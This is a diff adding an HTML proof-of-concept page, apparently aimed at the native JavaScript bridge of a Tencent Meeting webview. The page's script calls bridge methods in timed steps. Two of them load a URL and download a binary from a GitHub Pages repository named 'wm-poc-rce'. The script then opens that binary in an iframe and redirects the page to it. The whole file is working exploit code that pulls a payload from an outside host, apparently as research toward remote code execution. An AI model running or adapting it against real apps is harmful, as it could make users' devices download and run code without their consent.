@@ -1,0 +1,23 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P38IN</h1>
+<script>
+document.title='P38IN:'+location.host+'|'+location.protocol;
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var file='https://gitwhs.github.io/wm-poc-rce/p25.bin';
+window.__p=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  document.title='P38CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,48);
+};
+function c(m,e,p,id){
+  if(!window.JSCallJavaMgr){document.title='P38NOJSB:'+location.host;return}
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:m,method:e,param:p||{},callId:id||(m+'.'+e)}));
+}
+function fr(u){var f=document.createElement('iframe');f.src=u;document.body.appendChild(f)}
+setTimeout(function(){document.title='P38T-GP';c('CommonPlugin','GetPerformance',{},'p38gp')},800);
+setTimeout(function(){document.title='P38T-LU';c('CommonPlugin','LoadUrl',{url:official},'p38lu')},2500);
+setTimeout(function(){document.title='P38T-DL';c('CommonPlugin','DownloadFile',{url:file,fileName:'p38.bin'},'p38dl')},4500);
+setTimeout(function(){document.title='P38T-IFR';fr(file)},6500);
+setTimeout(function(){document.title='P38T-BIN';location.href=file},8500);
+</script>
+</body></html>
